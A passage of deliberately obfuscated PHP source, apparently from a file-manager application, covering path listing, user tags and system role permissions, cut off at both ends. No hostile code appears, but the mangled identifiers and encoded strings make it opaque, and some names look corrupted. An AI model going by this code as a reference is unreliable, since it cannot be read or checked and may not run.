$œÇ¼ï¥×[$¨’â‹üÙ[$ƒ®Õø³[587]]]; if (!$ÒÎÚ–íé) { $ØŠÅû—->remove($¨’â‹üÙ[$ƒ®Õø³[477]]); unset($ë§¯ó²¨[$ˆÔâÊ•ş]); continue; } $½ƒĞ´£ = $ğËß¤ê¸->listData($ÒÎÚ–íé[$ƒ®Õø³[498]]); if (!$½ƒĞ´£) { $ØŠÅû—->remove($¨’â‹üÙ[$ƒ®Õø³[477]]); unset($ë§¯ó²¨[$ˆÔâÊ•ş]); continue; } $¨’â‹üÙ[$ƒ®Õø³[498]] = $½ƒĞ´£; $¨’â‹üÙ[$ƒ®Õø³[588]] = $ÒÎÚ–íé; $¨’â‹üÙ[$ƒ®Õø³[589]] = Model($ƒ®Õø³[590])->getInfoSimpleOuter($¨’â‹üÙ[$ƒ®Õø³[538]]); $ë§¯ó²¨[$ˆÔâÊ•ş] = $¨’â‹üÙ; } } $‘ˆÂÈŠ© = USER_ID; $æŸ§øîŸ = array(); $Ÿ•áÏ³¬ = $this->_listAppendPath($æŸ§øîŸ, !0); foreach ($Š³šÊ¥¡ as $ˆÔâÊ•ş => &$¨’â‹üÙ) { if (!is_array($¨’â‹üÙ[$ƒ®Õø³[498]])) { continue; } if ($¨’â‹üÙ[$ƒ®Õø³[191]] != $ƒ®Õø³[591]) { continue; } if (isset($ë§¯ó²¨[$¨’â‹üÙ[$ƒ®Õø³[194]]])) { $Ò¾à’´ = $ë§¯ó²¨[$¨’â‹üÙ[$ƒ®Õø³[194]]]; if (!is_array($¨’â‹üÙ[$ƒ®Õø³[552]])) { $¨’â‹üÙ[$ƒ®Õø³[552]] = array(); } $¨’â‹üÙ[$ƒ®Õø³[552]][$ƒ®Õø³[592]] = $Ò¾à’´[$ƒ®Õø³[587]]; $¨’â‹üÙ[$ƒ®Õø³[498]][$ƒ®Õø³[593]] = $Ò¾à’´; $¨’â‹üÙ[$ƒ®Õø³[498]][$ƒ®Õø³[594]] = $¨’â‹üÙ[$ƒ®Õø³[595]]; $¨’â‹üÙ[$ƒ®Õø³[498]][$ƒ®Õø³[596]] = $ƒ®Õø³[91]; if ($Ò¾à’´[$ƒ®Õø³[538]] != $‘ˆÂÈŠ©) { $¨’â‹üÙ[$ƒ®Õø³[498]][$ƒ®Õø³[499]] = $¨’â‹üÙ[$ƒ®Õø³[498]][$ƒ®Õø³[499]] & $Ò¾à’´[$ƒ®Õø³[498]][$ƒ®Õø³[498]]; } continue; } $ ¦¬¡äˆ = $this->parentLevelArray($¨’â‹üÙ[$ƒ®Õø³[597]]); $Ì§êêÔÁ = array_reverse($ ¦¬¡äˆ); foreach ($Ì§êêÔÁ as $€ÂšÈšÚ => $ş‰¿¯) { if (!isset($ë§¯ó²¨[$ş‰¿¯])) { continue; } $Ò¾à’´ = $ë§¯ó²¨[$ş‰¿¯]; $¨’â‹üÙ[$ƒ®Õø³[498]][$ƒ®Õø³[593]] = $Ò¾à’´; if ($Ò¾à’´[$ƒ®Õø³[538]] != $‘ˆÂÈŠ©) { $¨’â‹üÙ[$ƒ®Õø³[498]][$ƒ®Õø³[499]] = $¨’â‹üÙ[$ƒ®Õø³[498]][$ƒ®Õø³[499]] & $Ò¾à’´[$ƒ®Õø³[498]][$ƒ®Õø³[498]]; } $¿àçà­ü = $ƒ®Õø³[12]; $ü¸ı¶¸í = count($ ¦¬¡äˆ) - $€ÂšÈšÚ; for ($§¥œÕÛ = 0; $§¥œÕÛ < $ü¸ı¶¸í; $§¥œÕÛ++) { if (!isset($Ÿ•áÏ³¬[$ ¦¬¡äˆ[$§¥œÕÛ]])) { $¿àçà­ü = $ƒ®Õø³[12]; break; } $¿àçà­ü = $¿àçà­ü . rtrim($Ÿ•áÏ³¬[$ ¦¬¡äˆ[$§¥œÕÛ]], $ƒ®Õø³[8]) . $ƒ®Õø³[8]; } $¨’â‹üÙ[$ƒ®Õø³[498]][$ƒ®Õø³[594]] = rtrim($¿àçà­ü, $ƒ®Õø³[8]) . $ƒ®Õø³[8]; break; } } unset($¨’â‹üÙ); } public function groupPathDisplay(&$€Î†şÎ) { $¬âõ­ë =& $_SERVER[Î·Ü›öğ]; if ($€Î†şÎ[$¬âõ­ë[191]] != self::TYPE_GROUP) { return; } $Ÿ’ñ¹ˆ“ = Model($¬âõ­ë[598])->getInfo($€Î†şÎ[$¬âõ­ë[582]]); $ˆ÷ÑñÉ = $this->parentLevelArray($Ÿ’ñ¹ˆ“[$¬âõ­ë[597]]); $öªú« = $¬âõ­ë[12]; foreach ($ˆ÷ÑñÉ as $ŸÚşÇÊ‹) { $¬˜è»¬ = Model($¬âõ­ë[598])->getInfo($ŸÚşÇÊ‹); $öªú« .= $¬˜è»¬[$¬âõ­ë[90]][$¬âõ­ë[194]] . $¬âõ­ë[50]; } $€Î†şÎ[$¬âõ­ë[599]] = $Ÿ’ñ¹ˆ“[$¬âõ­ë[193]]; $€Î†şÎ[$¬âõ­ë[600]] = $Ÿ’ñ¹ˆ“[$¬âõ­ë[597]]; $€Î†şÎ[$¬âõ­ë[601]] = $Ÿ’ñ¹ˆ“[$¬âõ­ë[602]]; $€Î†şÎ[$¬âõ­ë[603]] = $öªú« . $Ÿ’ñ¹ˆ“[$¬âõ­ë[90]][$¬âõ­ë[194]]; } protected function _listAppendPath(&$šÓèÒ›, $İŠ½–èÒ = false) { $æÛ¿˜àÏ =& $_SERVER[Î·Ü›öğ]; static $Ÿê×î”– = array(); $×á–¼äÄ = array(); $ï£À¬× = array(); if ($İŠ½–èÒ) { return $Ÿê×î”–; } foreach ($šÓèÒ› as &$‘ñšèÔ†) { $ú®¤™Ÿñ = $‘ñšèÔ†[$æÛ¿˜àÏ[194]]; if ($‘ñšèÔ†[$æÛ¿˜àÏ[496]] == $æÛ¿˜àÏ[91] && $‘ñšèÔ†[$æÛ¿˜àÏ[193]] != 0) { $Ÿê×î”–[$ú®¤™Ÿñ] = $‘ñšèÔ†[$æÛ¿˜àÏ[32]]; } if ($‘ñšèÔ†[$æÛ¿˜àÏ[496]] == $æÛ¿˜àÏ[91] && $‘ñšèÔ†[$æÛ¿˜àÏ[193]] == 0) { $Ÿê×î”–[$ú®¤™Ÿñ] = $this->_listAppendPathRoot($‘ñšèÔ†, array()); } if (isset($ï£À¬×[$‘ñšèÔ†[$æÛ¿˜àÏ[597]]])) { continue; } $ï£À¬×[$‘ñšèÔ†[$æÛ¿˜àÏ[597]]] = !0; $ù„Á‡­ğ = $this->parentLevelArray($‘ñšèÔ†[$æÛ¿˜àÏ[597]]); foreach ($ù„Á‡­ğ as $©ù·Ú¸í => $ËÏˆÌ‘°) { if (isset($Ÿê×î”–[$ËÏˆÌ‘°])) { continue; } if ($©ù·Ú¸í == 0) { $Ÿê×î”–[$ËÏˆÌ‘°] = $this->_listAppendPathRoot($‘ñšèÔ†, $ù„Á‡­ğ); } if ($©ù·Ú¸í != 0) { $×á–¼äÄ[] = $ËÏˆÌ‘°; } } } unset($‘ñšèÔ†); $×á–¼äÄ = array_unique($×á–¼äÄ); if (count($×á–¼äÄ) > 0) { $Ø¯‹×§ = array($æÛ¿˜àÏ[502] => array($æÛ¿˜àÏ[503], $×á–¼äÄ)); if (count($×á–¼äÄ) == 1) { $ŸŞ ê = $this->sourceInfo($×á–¼äÄ[0]); $£èú¬İ = is_array($ŸŞ ê) ? array($ŸŞ ê) : !1; } else { $£èú¬İ = $this->field($æÛ¿˜àÏ[604])->where($Ø¯‹×§)->select(); } if (!$£èú¬İ) { $£èú¬İ = array(); } foreach ($£èú¬İ as $ò÷‰’Â²) { $Ÿê×î”–[$ò÷‰’Â²[$æÛ¿˜àÏ[194]]] = $ò÷‰’Â²[$æÛ¿˜àÏ[32]]; } } $ÕŒÖ‚’« = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¥ëí»÷â = array(); foreach ($šÓèÒ› as &$‘ñšèÔ†) { $÷Üâ¬«‚ = $‘ñšèÔ†[$æÛ¿˜àÏ[597]]; $¹œ©†Ğ = $æÛ¿˜àÏ[12]; if (isset($¥ëí»÷â[$÷Üâ¬«‚])) { $¹œ©†Ğ = $¥ëí»÷â[$÷Üâ¬«‚]; } else { $ù„Á‡­ğ = $this->parentLevelArray($‘ñšèÔ†[$æÛ¿˜àÏ[597]]); foreach ($ù„Á‡­ğ as $©ù·Ú¸í => $ËÏˆÌ‘°) { if (isset($Ÿê×î”–[$ËÏˆÌ‘°])) { $¹œ©†Ğ .= $Ÿê×î”–[$ËÏˆÌ‘°] . $æÛ¿˜àÏ[8]; } } $¥ëí»÷â[$÷Üâ¬«‚] = $¹œ©†Ğ; } $¹œ©†Ğ .= $‘ñšèÔ†[$æÛ¿˜àÏ[32]]; if ($‘ñšèÔ†[$æÛ¿˜àÏ[496]] == $æÛ¿˜àÏ[91]) { $¹œ©†Ğ .= $æÛ¿˜àÏ[8]; } $‘ñšèÔ†[$æÛ¿˜àÏ[595]] = str_replace($æÛ¿˜àÏ[257], $æÛ¿˜àÏ[8], $¹œ©†Ğ); if ($‘ñšèÔ†[$æÛ¿˜àÏ[193]] == $æÛ¿˜àÏ[231]) { $‘ñšèÔ†[$æÛ¿˜àÏ[32]] = trim($Ÿê×î”–[$‘ñšèÔ†[$æÛ¿˜àÏ[194]]], $æÛ¿˜àÏ[8]); $‘ñšèÔ†[$æÛ¿˜àÏ[595]] = $‘ñšèÔ†[$æÛ¿˜àÏ[32]] . $æÛ¿˜àÏ[8]; } if (intval($‘ñšèÔ†[$æÛ¿˜àÏ[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($‘ñšèÔ†, $ù„Á‡­ğ, $ÕŒÖ‚’«); } } unset($‘ñšèÔ†); return $šÓèÒ›; } private function _listAppendPathRecycle(&$ÚùĞ—‚, $êõÌØ®Ì, $¡˜éó™Å) { $ãÏ”ÊÙ¹ =& $_SERVER[Î·Ü›öğ]; if (!in_array($¡˜éó™Å, $êõÌØ®Ì) && $ÚùĞ—‚[$ãÏ”ÊÙ¹[194]] != $¡˜éó™Å) { return; } $½à‡‚ÚÀ = explode($ãÏ”ÊÙ¹[8], trim($ÚùĞ—‚[$ãÏ”ÊÙ¹[595]], $ãÏ”ÊÙ¹[8])); $ÔôÊŠŸ = implode($ãÏ”ÊÙ¹[8], array_slice($½à‡‚ÚÀ, 2)); $ÚùĞ—‚[$ãÏ”ÊÙ¹[595]] = $ãÏ”ÊÙ¹[8] . LNG($ãÏ”ÊÙ¹[605]) . $ãÏ”ÊÙ¹[8] . ltrim($ÔôÊŠŸ, $ãÏ”ÊÙ¹[8]); $ÚùĞ—‚[$ãÏ”ÊÙ¹[597]] = $ãÏ”ÊÙ¹[606] . implode($ãÏ”ÊÙ¹[50], array_slice($êõÌØ®Ì, 1)) . $ãÏ”ÊÙ¹[50]; if ($ÚùĞ—‚[$ãÏ”ÊÙ¹[194]] == $¡˜éó™Å) { $ÚùĞ—‚[$ãÏ”ÊÙ¹[597]] = $ãÏ”ÊÙ¹[606]; $ÚùĞ—‚[$ãÏ”ÊÙ¹[193]] = $ãÏ”ÊÙ¹[231]; $ÚùĞ—‚[$ãÏ”ÊÙ¹[32]] = LNG($ãÏ”ÊÙ¹[605]); } $ÚùĞ—‚[$ãÏ”ÊÙ¹[607]] = $ãÏ”ÊÙ¹[608]; } protected function _listAppendPathRoot(&$ß¥İ£, $·ÑŸÖ–Ş) { $ˆÕêÀ•¿ =& $_SERVER[Î·Ü›öğ]; static $å²µŠ•Å = false; static $êÜ¨â‹ = false; $ÛíÉ¤Âè = $ˆÕêÀ•¿[12]; if ($ß¥İ£[$ˆÕêÀ•¿[191]] == self::TYPE_USER) { if ($ß¥İ£[$ˆÕêÀ•¿[582]] == USER_ID) { $ÛíÉ¤Âè = LNG($ˆÕêÀ•¿[609]); if ($å²µŠ•Å === !1) { $Ò÷£Âî = Model($ˆÕêÀ•¿[610])->getInfoFull(USER_ID); $å²µŠ•Å = _get($Ò÷£Âî, $ˆÕêÀ•¿[611], $ˆÕêÀ•¿[12]); } if ($êÜ¨â‹ === !1) { $Ò÷£Âî = Model($ˆÕêÀ•¿[610])->getInfoFull(USER_ID); $êÜ¨â‹ = _get($Ò÷£Âî, $ˆÕêÀ•¿[612], $ˆÕêÀ•¿[12]); } if ($·ÑŸÖ–Ş && $·ÑŸÖ–Ş[0] == $å²µŠ•Å || !$·ÑŸÖ–Ş && $ß¥İ£[$ˆÕêÀ•¿[194]] == $å²µŠ•Å) { $ÛíÉ¤Âè = LNG($ˆÕêÀ•¿[613]); $ß¥İ£[$ˆÕêÀ•¿[614]] = $ˆÕêÀ•¿[615]; } if ($·ÑŸÖ–Ş && $·ÑŸÖ–Ş[0] == $êÜ¨â‹ || !$·ÑŸÖ–Ş && $ß¥İ£[$ˆÕêÀ•¿[194]] == $êÜ¨â‹) { $ÛíÉ¤Âè = $ÛíÉ¤Âè . $ˆÕêÀ•¿[616] . LNG($ˆÕêÀ•¿[617]); } if (!$·ÑŸÖ–Ş) { $ß¥İ£[$ˆÕêÀ•¿[32]] = $ÛíÉ¤Âè; } } else { $Ò÷£Âî = Model($ˆÕêÀ•¿[610])->getInfoFull($ß¥İ£[$ˆÕêÀ•¿[582]]); $«³ÙŞ»İ = _get($Ò÷£Âî, $ˆÕêÀ•¿[612], $ˆÕêÀ•¿[12]); $ß¥İ£[$ˆÕêÀ•¿[618]] = Model($ˆÕêÀ•¿[590])->getInfoSimpleOuter($ß¥İ£[$ˆÕêÀ•¿[582]]); $ÛíÉ¤Âè = LNG($ˆÕêÀ•¿[619]) . $ˆÕêÀ•¿[176] . $ß¥İ£[$ˆÕêÀ•¿[618]][$ˆÕêÀ•¿[32]] . $ˆÕêÀ•¿[178]; if ($·ÑŸÖ–Ş && $·ÑŸÖ–Ş[0] == $«³ÙŞ»İ || !$·ÑŸÖ–Ş && $ß¥İ£[$ˆÕêÀ•¿[194]] == $«³ÙŞ»İ) { $ÛíÉ¤Âè = LNG($ˆÕêÀ•¿[619]) . $ˆÕêÀ•¿[620] . $ß¥İ£[$ˆÕêÀ•¿[618]][$ˆÕêÀ•¿[32]] . $ˆÕêÀ•¿[616] . LNG($ˆÕêÀ•¿[617]) . $ˆÕêÀ•¿[178]; } } } else { if ($ß¥İ£[$ˆÕêÀ•¿[191]] == self::TYPE_GROUP) { $ùƒ›ÌÛÕ = Model($ˆÕêÀ•¿[598])->getInfoSimple($ß¥İ£[$ˆÕêÀ•¿[582]]); $ÛíÉ¤Âè = $ùƒ›ÌÛÕ[$ˆÕêÀ•¿[32]]; } else { if ($ß¥İ£[$ˆÕêÀ•¿[191]] == self::TYPE_SYSTEM) { $ÛíÉ¤Âè = $ˆÕêÀ•¿[621]; } } } $ÛíÉ¤Âè = $ÛíÉ¤Âè ? $ˆÕêÀ•¿[8] . $ÛíÉ¤Âè . $ˆÕêÀ•¿[8] : $ˆÕêÀ•¿[8]; return $ÛíÉ¤Âè; } protected function _listAppendUser(&$¾¹„ÔñÈ) { $¨·ı¹úè =& $_SERVER[Î·Ü›öğ]; $ÉÆÚŞ²í = array_to_keyvalue($¾¹„ÔñÈ, $¨·ı¹úè[12], $¨·ı¹úè[538]); $ÒöÀíŞ— = array_to_keyvalue($¾¹„ÔñÈ, $¨·ı¹úè[12], $¨·ı¹úè[540]); $úÑºÕŠµ = array_merge($ÉÆÚŞ²í, $ÒöÀíŞ—); $İ‰Ñ“Áü = Model($¨·ı¹úè[610])->userListInfo($úÑºÕŠµ); foreach ($¾¹„ÔñÈ as &$°ïßîÏê) { $•ùô±Ä¿ = $°ïßîÏê[$¨·ı¹úè[538]]; $°ïßîÏê[$¨·ı¹úè[538]] = $İ‰Ñ“Áü[$•ùô±Ä¿] ? $İ‰Ñ“Áü[$•ùô±Ä¿] : !1; $•ùô±Ä¿ = $°ïßîÏê[$¨·ı¹úè[540]]; $°ïßîÏê[$¨·ı¹úè[540]] = $İ‰Ñ“Áü[$•ùô±Ä¿] ? $İ‰Ñ“Áü[$•ùô±Ä¿] : !1; if (_get($°ïßîÏê, $¨·ı¹úè[622], 0)) { $Ç¾ıÈˆ = $GLOBALS[$¨·ı¹úè[6]][$¨·ı¹úè[92]][$¨·ı¹úè[623]]; if ($°ïßîÏê[$¨·ı¹úè[552]][$¨·ı¹úè[624]] <= time() - $Ç¾ıÈˆ) { $this->metaSet($°ïßîÏê[$¨·ı¹úè[194]], $¨·ı¹úè[625], null); $this->metaSet($°ïßîÏê[$¨·ı¹úè[194]], $¨·ı¹úè[624], null); unset($°ïßîÏê[$¨·ı¹úè[552]][$¨·ı¹úè[625]]); continue; } $Ç€âè®¦ = $°ïßîÏê[$¨·ı¹úè[552]][$¨·ı¹úè[625]]; $°ïßîÏê[$¨·ı¹úè[552]][$¨·ı¹úè[626]] = Model($¨·ı¹úè[610])->getInfoSimpleOuter($Ç€âè®¦); } } unset($°ïßîÏê); } public function parentLevelArray($ÏÛÑ‘®) { $»Şô´äí =& $_SERVER[Î·Ü›öğ]; $ÏÛÑ‘® = explode($»Şô´äí[50], trim($ÏÛÑ‘®, $»Şô´äí[50])); return array_to_int(array_filter($ÏÛÑ‘®)); } public function listAll($ëËã¡‹Ñ) { $ùÜşæÌ‘ =& $_SERVER[Î·Ü›öğ]; $ÚĞãÕù = $this->sourceInfo($ëËã¡‹Ñ); $Ş÷š¿™ = array($ùÜşæÌ‘[627] => array($ùÜşæÌ‘[628], $ÚĞãÕù[$ùÜşæÌ‘[597]] . $ëËã¡‹Ñ . $ùÜşæÌ‘[629]), $ùÜşæÌ‘[630] => 0); $Š»Öøğ« = $ùÜşæÌ‘[631]; $ÑÙßˆë = "\114\x45\106\x54\x20\x4a\x4f\111\116\x20{$this->tablePrefix}\x69\157\137\146\151\x6c\x65\x20\x66\x69\154\145\40\x6f\x6e\x20\x73\157\165\x72\x63\145\x2e\x66\x69\154\145\x49\104\x20\x3d\40\146\151\x6c\x65\x2e\146\151\x6c\145\x49\x44"; $«§¦¬¢’ = $this->alias($ùÜşæÌ‘[530])->field($Š»Öøğ«)->where($Ş÷š¿™)->join($ÑÙßˆë)->select(); $this->_listAppendAuth($«§¦¬¢’); $this->_listAppendUser($«§¦¬¢’); $this->_listAppendPath($«§¦¬¢’); $«§¦¬¢’ = array_to_keyvalue($«§¦¬¢’, $ùÜşæÌ‘[194]); $ô†¯È¿û = "\x2f{$ÚĞãÕù[$ùÜşæÌ‘[32]]}\x2f"; $ô†¯È¿û = $ô†¯È¿û == $ùÜşæÌ‘[257] ? $ùÜşæÌ‘[8] : $ô†¯È¿û; $œ÷¸®ƒ = array(); foreach ($«§¦¬¢’ as $ÊÉ›ç¶ì => $Û‰º˜ãÒ) { $¸¾Ö»áç = $this->parentLevelArray($Û‰º˜ãÒ[$ùÜşæÌ‘[597]]); array_shift($¸¾Ö»áç); $‘ªêÙŞñ = $ô†¯È¿û; for ($úóóÎ½˜ = 0; $úóóÎ½˜ < count($¸¾Ö»áç); $úóóÎ½˜++) { $‘ªêÙŞñ .= $«§¦¬¢’[$¸¾Ö»áç[$úóóÎ½˜]][$ùÜşæÌ‘[32]] . $ùÜşæÌ‘[8]; } $‘ªêÙŞñ .= $Û‰º˜ãÒ[$ùÜşæÌ‘[32]]; if ($Û‰º˜ãÒ[$ùÜşæÌ‘[496]]) { $‘ªêÙŞñ .= $ùÜşæÌ‘[8]; } $ü•ë´˜ = array($ùÜşæÌ‘[506] => str_replace($ùÜşæÌ‘[257], $ùÜşæÌ‘[8], str_replace($ùÜşæÌ‘[257], $ùÜşæÌ‘[8], str_replace($ùÜşæÌ‘[257], $ùÜşæÌ‘[8], $‘ªêÙŞñ))), $ùÜşæÌ‘[632] => intval($Û‰º˜ãÒ[$ùÜşæÌ‘[496]]), $ùÜşæÌ‘[633] => intval($Û‰º˜ãÒ[$ùÜşæÌ‘[79]]), $ùÜşæÌ‘[88] => intval($Û‰º˜ãÒ[$ùÜşæÌ‘[88]]), $ùÜşæÌ‘[90] => $this->pathInfoFilter($Û‰º˜ãÒ)); if (!$ü•ë´˜[$ùÜşæÌ‘[496]]) { $ü•ë´˜[$ùÜşæÌ‘[554]] = $Û‰º˜ãÒ[$ùÜşæÌ‘[554]]; } $œ÷¸®ƒ[] = $ü•ë´˜; } $œ÷¸®ƒ = array_sort_by($œ÷¸®ƒ, $ùÜşæÌ‘[87]); return $œ÷¸®ƒ; } } goto d‘…¦âÛ¢ª; AŠÈÔï …«: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\56\x74\x61\147\x4c\x69\163\x74"; public $modelType = "\125\x73\145\162\117\160\x74\x69\157\x6e"; public $field = array("\x6e\141\x6d\145", "\163\164\x79\x6c\x65", "\163\x6f\x72\x74"); public function listData($‰¼¯Š = false, $ÀıòÏ×û = "\x73\157\162\x74", $ÅïûÜŠß = false) { return parent::listData($‰¼¯Š, $ÀıòÏ×û, $ÅïûÜŠß); } public function remove($¬ıóİ®Ÿ) { return parent::remove($¬ıóİ®Ÿ); } public function add($¸Ê´Ìß, $Ã¦Šô§Ö = "\x6c\x61\142\x65\154\55\x67\162\x65\171\55\x6e\157\x72\155\x61\154") { $†Ê®±Ù™ =& $_SERVER[Î·Ü›öğ]; if ($this->findByName($¸Ê´Ìß)) { return !1; } $¢Ÿ®ÂÆÊ = array($†Ê®±Ù™[505] => $¸Ê´Ìß, $†Ê®±Ù™[571] => $Ã¦Šô§Ö, $†Ê®±Ù™[2014] => $this->getSort($†Ê®±Ù™[338]) + 1); return parent::insert($¢Ÿ®ÂÆÊ); } public function update($ß‚îÆ­¾, $½€¼Çêá) { $ÈÚ•Ó” =& $_SERVER[Î·Ü›öğ]; $ÃÇ¨”ÍÈ = $this->listData($ß‚îÆ­¾); $øøç¦£Ÿ = $this->findByName($½€¼Çêá[$ÈÚ•Ó”[32]]); if (!$ÃÇ¨”ÍÈ || $øøç¦£Ÿ && $øøç¦£Ÿ[$ÈÚ•Ó”[477]] != $ÃÇ¨”ÍÈ[$ÈÚ•Ó”[477]]) { return !1; } return parent::update($ß‚îÆ­¾, $½€¼Çêá); } public function moveTop($Š Ğ¤è) { $® —°ü =& $_SERVER[Î·Ü›öğ]; $ÂÎÌ–è = parent::listData(); $Ø£ä®ÔÃ = $this->getSort($® —°ü[337]); foreach ($ÂÎÌ–è as &$ğãÑéÚÛ) { if ($ğãÑéÚÛ[$® —°ü[477]] == $Š Ğ¤è) { $ğãÑéÚÛ[$® —°ü[2034]] = $Ø£ä®ÔÃ; continue; } $ğãÑéÚÛ[$® —°ü[2034]] += 1; } unset($ğãÑéÚÛ); return parent::resetData($ÂÎÌ–è); } public function moveBottom($ÈÇ¨°´ë) { $Å…§æÙ” =& $_SERVER[Î·Ü›öğ]; $£õğ°‰“ = $this->getSort($Å…§æÙ”[338]) + 1; return parent::update($ÈÇ¨°´ë, array($Å…§æÙ”[2034] => $£õğ°‰“)); } public function resetSort($è©Ğ•éÔ) { $Şšˆİè =& $_SERVER[Î·Ü›öğ]; $Ó©Ô·î = array(); $è©Ğ•éÔ = is_array($è©Ğ•éÔ) ? $è©Ğ•éÔ : array(); for ($˜ôõšµ” = 0; $˜ôõšµ” < count($è©Ğ•éÔ); $˜ôõšµ”++) { $Ó©Ô·î[$è©Ğ•éÔ[$˜ôõšµ”] . $Şšˆİè[12]] = $˜ôõšµ” + 1; } $ôÓ€®¦¹ = parent::listData(); foreach ($ôÓ€®¦¹ as &$´­ñˆ˜¤) { $ìÕıÍõä = $Ó©Ô·î[$´­ñˆ˜¤[$Şšˆİè[477]]]; $´­ñˆ˜¤[$Şšˆİè[2034]] = $ìÕıÍõä ? $ìÕıÍõä : $´­ñˆ˜¤[$Şšˆİè[2034]]; } unset($´­ñˆ˜¤); return parent::resetData($ôÓ€®¦¹); } private function getSort($…½¨áå) { $Â¶óŞú =& $_SERVER[Î·Ü›öğ]; $‡ƒùá³ = parent::listData(); $«Öƒ¢£° = array_to_keyvalue($‡ƒùá³, $Â¶óŞú[12], $Â¶óŞú[2034]); if (!$«Öƒ¢£°) { $«Öƒ¢£° = array(0); } $äêÒÅ = $…½¨áå == $Â¶óŞú[338] ? max($«Öƒ¢£°) : min($«Öƒ¢£°); return intval($äêÒÅ); } } goto Añ»©˜Îà; d‡ˆ‹ğË®: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\162\157\x6c\145\114\151\163\x74"; public $field = array("\x6e\x61\155\145", "\141\165\x74\150", "\154\141\142\145\154", "\x64\151\163\x70\x6c\141\171", "\163\171\163\x74\145\155", "\x64\145\163\x63", "\x69\147\156\x6f\x72\x65\105\x78\164", "\x69\x67\156\157\162\x65\x46\151\154\145\x53\x69\x7a\145", "\141\x64\155\x69\x6e\151\x73\164\x72\141\x74\157\x72", "\x73\157\162\x74"); public function listData($…é¡‰¦ = false, $öĞ·Õ = "\163\157\162\x74", $ˆ—Öà² = false) { $¹±èìøÁ =& $_SERVER[Î·Ü›öğ]; $óŒï»è = parent::listData($…é¡‰¦, $öĞ·Õ, $ˆ—Öà²); if (!$…é¡‰¦) { foreach ($óŒï»è as $¬æó¡ => $ÜóÏ½üÓ) { if ($ÜóÏ½üÓ[$¹±èìøÁ[2211]] == 1) { $óŒï»è[$¬æó¡][$¹±èìøÁ[537]] = LNG($¹±èìøÁ[2505]); } } } return $óŒï»è; } public function update($—´‘ñÕˆ, $ÃŞƒ—Õğ) { $ÊÓ»åş– =& $_SERVER[Î·Ü›öğ]; $éò—’‰± = parent::listData($—´‘ñÕˆ); $œ®Ó¨ÛÏ = $this->findByName($ÃŞƒ—Õğ[$ÊÓ»åş–[32]]); if (!$éò—’‰± || $œ®Ó¨ÛÏ && $œ®Ó¨ÛÏ[$ÊÓ»åş–[477]] != $éò—’‰±[$ÊÓ»åş–[477]]) { return !1; } if ($œ®Ó¨ÛÏ[$ÊÓ»åş–[2211]] == 1) { $ÃŞƒ—Õğ = array($ÊÓ»åş–[32] => $ÃŞƒ—Õğ[$ÊÓ»åş–[32]], $ÊÓ»åş–[2033] => $ÃŞƒ—Õğ[$ÊÓ»åş–[2033]]); } $this->filterAuth($ÃŞƒ—Õğ[$ÊÓ»åş–[498]]); return parent::update($—´‘ñÕˆ, $ÃŞƒ—Õğ); } public function remove($Ñ¥Äœ·ñ) { $Ùú™— = parent::listData($Ñ¥Äœ·ñ); if (!$Ùú™— || $Ùú™—[$_SERVER[Î·Ü›öğ][192]]) { return !1; } return parent::remove($Ñ¥Äœ·ñ); } public function add($¼ÖÙ ²ò) { $Şïçê–ú =& $_SERVER[Î·Ü›öğ]; $ø£ÆáÂ› = $¼ÖÙ ²ò[$Şïçê–ú[32]]; if ($this->findByName($ø£ÆáÂ›)) { return !1; } $˜Æ®Ûª = array($Şïçê–ú[505] => $ø£ÆáÂ›, $Şïçê–ú[2016] => $Şïçê–ú[12], $Şïçê–ú[2012] => $Şïçê–ú[2020], $Şïçê–ú[2506] => 1, $Şïçê–ú[2015] => 0, $Şïçê–ú[2507] => 0, $Şïçê–ú[2014] => $this->getSort()); $¼ÖÙ ²ò = array_merge($˜Æ®Ûª, $¼ÖÙ ²ò); $this->filterAuth($¼ÖÙ ²ò[$Şïçê–ú[498]]); return parent::insert($¼ÖÙ ²ò); } private function getSort() { $Œøè”Ú× =& $_SERVER[Î·Ü›öğ]; $Ëüßº Ú = parent::listData(); $“å‹ôö„ = array_to_keyvalue($Ëüßº Ú, $Œøè”Ú×[12], $Œøè”Ú×[2034]); return empty($“å‹ôö„) ? 0 : max($“å‹ôö„) + 1; } private function filterAuth(&$Ñê©ÌÁ) { $©Åäóáµ =& $_SERVER[Î·Ü›öğ]; $šµåé•£ = array(); $ƒéì‹µ‘ = array_filter(explode($©Åäóáµ[50], $Ñê©ÌÁ)); foreach ($ƒéì‹µ‘ as $Ñê©ÌÁ) { $Æ˜›€ = explode($©Åäóáµ[10], $Ñê©ÌÁ); if ($Æ˜›€[0] == $©Åäóáµ[2508] && $Æ˜›€[1] != $©Åäóáµ[1305]) { $œèÊûã = $Æ˜›€[0] . $©Åäóáµ[10] . $Æ˜›€[1] . $©Åäóáµ[2509]; if (!in_array($œèÊûã, $ƒéì‹µ‘)) { $šµåé•£[] = $œèÊûã; } } $šµåé•£[] = $Ñê©ÌÁ; } $Ñê©ÌÁ = implode($©Åäóáµ[50], $šµåé•£); } public function findRoleDefault() { $¸ÒÓìåÉ =& $_SERVER[Î·Ü›öğ]; $°õş•Êı = parent::listData(); $¹ñ—Èû = !1; foreach ($°õş•Êı as $†Ô€âİ«) { if (!$†Ô€âİ« || $†Ô€âİ«[$¸ÒÓìåÉ[2032]] == $¸ÒÓìåÉ[231] || $†Ô€âİ«[$¸ÒÓìåÉ[2211]] == 1) { continue; } if (strstr($†Ô€âİ«[$¸ÒÓìåÉ[498]], $¸ÒÓìåÉ[2510])) { continue; } if (!strstr($†Ô€âİ«[$¸ÒÓìåÉ[498]], $¸ÒÓìåÉ[2511])) { continue; } if (!$¹ñ—Èû) { $¹ñ—Èû = $†Ô€âİ«; continue; } $ÒõîÙô¯ = explode($¸ÒÓìåÉ[50], $¹ñ—Èû[$¸ÒÓìåÉ[498]]); $¾–î×÷† = explode($¸ÒÓìåÉ[50], $†Ô€âİ«[$¸ÒÓìåÉ[498]]); if (count($ÒõîÙô¯) > count($¾–î×÷†)) { $¹ñ—Èû = $†Ô€âİ«; } } return $¹ñ—Èû ? $¹ñ—Èû[$¸ÒÓìåÉ[477]] : $¸ÒÓìåÉ[12]; } public function sort($ˆ¦ûƒ¯ú, $Ñ‡²Å¦Ø) { return parent::update($ˆ¦ûƒ¯ú, $Ñ‡²Å¦Ø); } } class SystemTaskModel extends ModelBaseLight { public $optionType = 